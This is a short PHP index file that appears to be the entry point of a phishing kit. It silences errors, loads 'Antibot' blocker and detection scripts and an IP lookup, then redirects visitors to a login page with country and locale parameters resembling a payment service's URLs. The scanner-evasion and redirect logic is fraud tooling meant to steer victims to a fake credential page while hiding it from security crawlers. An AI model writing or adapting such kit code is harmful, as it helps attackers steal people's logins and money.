<?php
session_start();
error_reporting(0);


include('./assets/Antibot/blockers.php');
include('./assets/Antibot/detects.php');
include('./functions/get_ip.php');

header("LOCATION: login/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>
